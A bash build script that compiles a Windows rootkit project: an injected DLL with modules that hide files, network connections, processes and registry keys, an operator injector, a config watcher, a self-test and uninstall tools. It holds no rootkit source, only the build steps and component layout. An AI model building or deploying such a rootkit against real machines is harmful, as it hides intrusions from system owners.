#!/usr/bin/env bash
#
# build_mingw.sh - Build the rootkit with mingw-w64 on Windows (MSYS2/UCRT).
#
# Targets:
#   bin/RkDll.dll         - the rootkit DLL (injected into hosts)
#   bin/RkWatcher.exe     - out-of-process config watcher / injector
#   bin/RkInjector.exe    - operator loader (deploy ini + inject)
#   bin/lde_check.exe     - decoder + hook engine self-test (needs tests/)
#   bin/RkUnhook.dll      - uninstall helper DLL (RkClean: restore hooked .text)
#   bin/UninstallRkit.exe - uninstaller (stops rootkit processes, removes artifacts)
#
# Prereqs: x86_64-w64-mingw32-gcc / g++ on PATH (WinLibs, MSYS2, etc.)
#
# Usage:
#   ./build_mingw.sh           build everything + run the self-test
#   ./build_mingw.sh clean     remove build/ and bin/
#   OUT=dir ./build_mingw.sh   write outputs to dir instead of bin/
#                              (use a separate OUT when a Visual Studio
#                              instance builds the same solution folder,
#                              so the two toolchains do not clobber
#                              each other's outputs)
#
set -e

CC=${CC:-x86_64-w64-mingw32-gcc}
CXX=${CXX:-x86_64-w64-mingw32-g++}
OUT=${OUT:-bin}

CFLAGS_BASE="-std=gnu11 -O2 -Wall -Wextra -D_WIN32_WINNT=0x0A00"
CXXFLAGS_BASE="-std=gnu++17 -O2 -Wall -Wextra -D_WIN32_WINNT=0x0A00"

mkdir -p build "$OUT"

if [ "$1" = "clean" ]; then
    rm -rf build "$OUT"
    echo "cleaned"
    exit 0
fi

echo "== [1/7] RkDll.dll =="
$CXX $CXXFLAGS_BASE -c common/config.cpp    -o build/config.o
$CXX $CXXFLAGS_BASE -c common/hook.cpp      -o build/hook.o
$CC  $CFLAGS_BASE   -c common/lde.c         -o build/lde.o
$CXX $CXXFLAGS_BASE -c Rootkit/api.cpp      -o build/api.o
$CXX $CXXFLAGS_BASE -c Rootkit/dllmain.cpp  -o build/dllmain.o
$CXX $CXXFLAGS_BASE -c Rootkit/hide_file.cpp -o build/hide_file.o
$CXX $CXXFLAGS_BASE -c Rootkit/hide_net.cpp -o build/hide_net.o
$CXX $CXXFLAGS_BASE -c Rootkit/hide_proc.cpp -o build/hide_proc.o
$CXX $CXXFLAGS_BASE -c Rootkit/hide_reg.cpp -o build/hide_reg.o
$CXX $CXXFLAGS_BASE -c Rootkit/selfhide.cpp -o build/selfhide.o
$CXX $CXXFLAGS_BASE -shared \
    build/config.o build/hook.o build/lde.o build/api.o build/dllmain.o \
    build/hide_file.o build/hide_net.o build/hide_proc.o build/hide_reg.o \
    build/selfhide.o \
    -o "$OUT/RkDll.dll" -Wl,--out-implib,"$OUT/RkDll.lib" \
    -static-libgcc -ladvapi32 -lntdll

echo "== [2/7] RkWatcher.exe =="
$CC  $CFLAGS_BASE -c Rootkit/rk_config.c -o build/rk_config.o
$CXX $CXXFLAGS_BASE -c common/config.cpp -o build/config_w.o
$CXX $CXXFLAGS_BASE build/rk_config.o build/config_w.o \
    -o "$OUT/RkWatcher.exe" -static-libgcc -static-libstdc++ -ladvapi32 -lshell32 -lntdll

echo "== [3/7] RkInjector.exe =="
$CXX $CXXFLAGS_BASE -c Injector/main.cpp -o build/injector.o
$CXX $CXXFLAGS_BASE build/injector.o \
    -o "$OUT/RkInjector.exe" -static-libgcc -static-libstdc++ \
    -lshell32 -ladvapi32 -lntdll

if [ -f tests/lde_check.c ]; then
    echo "== [4/7] lde_check.exe =="
    $CC  $CFLAGS_BASE -I common -c tests/lde_check.c -o build/lde_check.o
    $CC  $CFLAGS_BASE -c common/lde.c -o build/lde_check_lde.o
    $CXX $CXXFLAGS_BASE -c common/hook.cpp -o build/lde_check_hook.o
    $CXX $CXXFLAGS_BASE build/lde_check.o build/lde_check_lde.o build/lde_check_hook.o \
        -o "$OUT/lde_check.exe" -static-libgcc -static-libstdc++ -lkernel32 -lntdll
else
    echo "== [4/7] lde_check.exe == skipped (tests/ missing)"
fi

echo "== [5/7] RkUnhook.dll =="
$CXX $CXXFLAGS_BASE -c Uninstall/RkUnhook.cpp -o build/rkunhook.o
$CXX $CXXFLAGS_BASE -shared build/rkunhook.o \
    -o "$OUT/RkUnhook.dll" -static-libgcc -static-libstdc++

echo "== [6/7] UninstallRkit.exe =="
$CXX $CXXFLAGS_BASE -c Uninstall/UninstallRkit.cpp -o build/uninstall_rkit.o
$CXX $CXXFLAGS_BASE build/uninstall_rkit.o \
    -o "$OUT/UninstallRkit.exe" -static-libgcc -static-libstdc++ \
    -lshell32 -ladvapi32

echo "== [7/7] deploy + self-test =="
cp rk.ini "$OUT/rk.ini" 2>/dev/null || true

if [ -f "$OUT/lde_check.exe" ]; then
    .//"$OUT"/lde_check.exe || { echo "SELF-TEST FAILED"; exit 1; }
fi

echo
echo "build complete:"
ls -la "$OUT"